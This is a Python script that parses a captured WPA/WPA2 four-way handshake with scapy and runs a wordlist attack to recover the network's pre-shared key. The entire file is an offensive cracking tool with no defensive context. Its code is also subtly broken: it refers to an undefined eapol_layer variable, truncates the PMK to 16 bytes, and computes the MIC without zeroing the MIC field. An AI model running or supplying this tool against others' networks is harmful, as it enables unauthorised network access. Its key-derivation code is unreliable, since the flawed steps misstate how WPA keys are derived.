import sys
import hmac
import hashlib
from binascii import a2b_hex, b2a_hex
from scapy.all import *

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")

    return mic, snonce, sta_mac, bssid, anonce, ssid

def psk_from_wordlist(wordlist, ssid, mic, snonce, anonce, sta_mac, bssid):
    with open(wordlist, 'r') as f:
        for word in f:
            word = word.strip()
            psk = hashlib.pbkdf2_hmac('sha1', word.encode(), ssid.encode(), 4096, 32)
            sta_mac_bytes = a2b_hex(sta_mac.replace(':', ''))
            bssid_bytes = a2b_hex(bssid.replace(':', ''))
            snonce_bytes = a2b_hex(snonce.hex())
            anonce_bytes = a2b_hex(anonce.hex())
            pke = b"Pairwise key expansion\x00" + min(sta_mac_bytes, bssid_bytes) + max(sta_mac_bytes, bssid_bytes) + min(snonce_bytes, anonce_bytes) + max(snonce_bytes, anonce_bytes)
            pmk = psk[:16]  # 16 bytes for PMK
            hmac1 = hmac.new(pmk, pke + b'\x00', hashlib.sha1).digest()
            hmac2 = hmac.new(pmk, pke + b'\x01', hashlib.sha1).digest()
            hmac3 = hmac.new(pmk, pke + b'\x02', hashlib.sha1).digest()
            hmac4 = hmac.new(pmk, pke + b'\x03', hashlib.sha1).digest()
            hmac5 = hmac.new(pmk, pke + b'\x04', hashlib.sha1).digest()
            ptk = hmac1 + hmac2 + hmac3 + hmac4 + hmac5[:16]

            # Calculate MIC
            data = eapol_layer[Raw].load
            hmac_mic = hmac.new(ptk[:16], data, hashlib.sha1).digest()[:16]
            if hmac_mic == mic:
                print(f"Found PSK: {word}")
                return word

    print("No PSK found in wordlist.")
    return None

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python extract_psk.py <input_file.cap/pcap> <wordlist.txt>")
        sys.exit(1)

    input_file = sys.argv[1]
    wordlist = sys.argv[2]
    mic, snonce, sta_mac, bssid, anonce, ssid = extract_mic_and_nonce_and_ssid(input_file)

    if mic and snonce and sta_mac and bssid and anonce and ssid:
        psk_from_wordlist(wordlist, ssid, mic, snonce, anonce, sta_mac, bssid)
